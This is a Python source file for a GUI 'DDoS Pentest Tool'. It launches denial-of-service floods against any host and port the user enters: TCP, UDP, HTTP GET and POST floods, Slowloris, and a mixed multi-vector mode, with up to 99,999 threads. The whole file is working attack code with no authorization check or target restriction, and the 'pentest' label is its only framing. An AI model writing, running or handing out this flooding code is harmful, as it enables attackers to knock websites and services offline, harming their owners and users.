import socket
import threading
import random
import time
import requests
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import queue


class DDoSToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title(" DDoS Pentest Tool")
        self.root.geometry("800x600")
        self.root.resizable(True, True)

        self.target = tk.StringVar()
        self.port = tk.StringVar(value="80")
        self.threads = tk.StringVar(value="500")
        self.duration = tk.StringVar(value="60")
        self.attack_type = tk.StringVar(value="1")
        self.running = False
        self.log_queue = queue.Queue()

        self.setup_ui()
        self.update_log()

    def setup_ui(self):
        # Title
        title_frame = ttk.Frame(self.root)
        title_frame.pack(fill=tk.X, padx=10, pady=5)
        ttk.Label(title_frame, text=" DDOS PENTEST TOOL",
                  font=("Arial", 14, "bold")).pack()

        # Input frame
        input_frame = ttk.LabelFrame(self.root, text="Target Configuration", padding=10)
        input_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(input_frame, text="Target IP/Hostname:").grid(row=0, column=0, sticky=tk.W, pady=2)
        ttk.Entry(input_frame, textvariable=self.target, width=25).grid(row=0, column=1, padx=5, pady=2)

        ttk.Label(input_frame, text="Port:").grid(row=0, column=2, sticky=tk.W, padx=(20, 0), pady=2)
        ttk.Entry(input_frame, textvariable=self.port, width=8).grid(row=0, column=3, padx=5, pady=2)

        ttk.Label(input_frame, text="Threads:").grid(row=1, column=0, sticky=tk.W, pady=2)
        ttk.Entry(input_frame, textvariable=self.threads, width=10).grid(row=1, column=1, padx=5, pady=2)

        ttk.Label(input_frame, text="Duration (s):").grid(row=1, column=2, sticky=tk.W, padx=(20, 0), pady=2)
        ttk.Entry(input_frame, textvariable=self.duration, width=8).grid(row=1, column=3, padx=5, pady=2)

        # Attack type frame
        attack_frame = ttk.LabelFrame(self.root, text="Attack Type", padding=10)
        attack_frame.pack(fill=tk.X, padx=10, pady=5)

        attack_options = [
            ("1. TCP Flood", "1"),
            ("2. UDP Flood", "2"),
            ("3. HTTP GET Flood", "3"),
            ("4. HTTP POST Flood", "4"),
            ("5. Slowloris", "5"),
            ("6. ALL (Multi-vector)", "6")
        ]

        for i, (text, value) in enumerate(attack_options):
            rb = ttk.Radiobutton(attack_frame, text=text, variable=self.attack_type, value=value)
            rb.grid(row=i // 2, column=i % 2, sticky=tk.W, padx=5, pady=2)

        # Control buttons
        btn_frame = ttk.Frame(self.root)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        self.start_btn = ttk.Button(btn_frame, text="START ATTACK", command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = ttk.Button(btn_frame, text="STOP ATTACK", command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        ttk.Button(btn_frame, text="Clear Log", command=self.clear_log).pack(side=tk.LEFT, padx=5)

        # Status frame
        self.status_frame = ttk.LabelFrame(self.root, text="Status", padding=10)
        self.status_frame.pack(fill=tk.X, padx=10, pady=5)

        self.status_label = ttk.Label(self.status_frame, text="Ready - Enter target details and select attack type")
        self.status_label.pack()

        self.progress = ttk.Progressbar(self.status_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=5)

        # Log frame
        log_frame = ttk.LabelFrame(self.root, text="Attack Log", padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, state=tk.DISABLED)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def log(self, message):
        """Thread-safe logging"""
        self.log_queue.put(f"[{time.strftime('%H:%M:%S')}] {message}\n")

    def update_log(self):
        """Update log from queue"""
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log_text.config(state=tk.NORMAL)
                self.log_text.insert(tk.END, message)
                self.log_text.see(tk.END)
                self.log_text.config(state=tk.DISABLED)
        except queue.Empty:
            pass
        self.root.after(100, self.update_log)

    def validate_inputs(self):
        """Validate input fields"""
        try:
            if not self.target.get().strip():
                raise ValueError("Target cannot be empty")

            port = int(self.port.get())
            if not 1 <= port <= 65535:
                raise ValueError("Port must be between 1-65535")

            threads = int(self.threads.get())
            if not 50 <= threads <= 99999:
                raise ValueError("Threads must be between 50-99999")

            duration = int(self.duration.get())
            if not 1 <= duration <= 300:
                raise ValueError("Duration must be between 1-300 seconds")

            return True
        except ValueError as e:
            messagebox.showerror("Input Error", str(e))
            return False

    def start_attack(self):
        if not self.validate_inputs():
            return

        self.running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.progress.start()
        self.status_label.config(text=f"Attacking {self.target.get()}:{self.port.get()} - Press STOP to cancel")

        # Start attack in separate thread
        threading.Thread(target=self.run_attack, daemon=True).start()

    def stop_attack(self):
        self.running = False
        self.progress.stop()
        self.status_label.config(text="Stopping attack...")

    def run_attack(self):
        target = self.target.get().strip()
        port = int(self.port.get())
        threads = int(self.threads.get())
        duration = int(self.duration.get())
        choice = self.attack_type.get()

        self.log(f"Starting {choice} attack on {target}:{port}")
        self.log(f"Threads: {threads}, Duration: {duration}s")

        tool = DDoSTool(target, port)
        tool.running = True
        tool.threads = threads
        tool.duration = duration
        tool.stop_time = time.time() + duration

        def attack_worker():
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for _ in range(threads):
                    if choice == '1':
                        future = executor.submit(tool.tcp_flood)
                    elif choice == '2':
                        future = executor.submit(tool.udp_flood)
                    elif choice == '3':
                        future = executor.submit(tool.http_get_flood)
                    elif choice == '4':
                        future = executor.submit(tool.http_post_flood)
                    elif choice == '5':
                        future = executor.submit(tool.slowloris)
                    elif choice == '6':
                        attack_types = [tool.tcp_flood, tool.udp_flood, tool.http_get_flood]
                        future = executor.submit(random.choice(attack_types))
                    futures.append(future)

                # Wait for duration or stop signal
                start_time = time.time()
                while self.running and (time.time() - start_time) < duration:
                    time.sleep(0.1)

                tool.running = False

        try:
            attack_worker()
            self.log("Attack completed!")
        except Exception as e:
            self.log(f"Attack error: {str(e)}")
        finally:
            self.after_main_thread(lambda: self.attack_finished())

    def attack_finished(self):
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress.stop()
        self.status_label.config(text="Attack completed - Ready for next test")

    def after_main_thread(self, callback):
        """Run callback on main thread"""
        self.root.after(0, callback)

    def clear_log(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)


class DDoSTool:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.running = True

    def tcp_flood(self):
        """TCP SYN flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            while self.running:
                sock.send(b'TCP_FLOOD' + bytes([random.randint(1, 1000)]))
        except:
            pass

    def udp_flood(self):
        """UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_random = random._urandom(1490)
        while self.running:
            try:
                sock.sendto(bytes_random, (self.target, self.port))
            except:
                pass

    def http_get_flood(self):
        """HTTP GET flood"""
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
        while self.running:
            try:
                requests.get(f"http://{self.target}:{self.port}", headers=headers, timeout=4)
            except:
                pass

    def http_post_flood(self):
        """HTTP POST flood"""
        data = {f'crash{random.randint(1, 999)}': 'A' * random.randint(500, 2000)}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': str(len(str(data)))
        }
        while self.running:
            try:
                requests.post(f"http://{self.target}:{self.port}", data=data, headers=headers, timeout=4)
            except:
                pass

    def slowloris(self):
        """Slowloris HTTP attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        req = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {self.target}\r\n"
        sock.connect((self.target, self.port))
        sock.send(req.encode())

        sent = 0
        while self.running:
            try:
                sock.send(f"X-A-{sent}: {random.randint(1, 5000)}a\r\n".encode())
                sent += 1
                if sent > 64:
                    time.sleep(15)
                    sent = 0
            except:
                break


def main():
    root = tk.Tk()
    app = DDoSToolGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
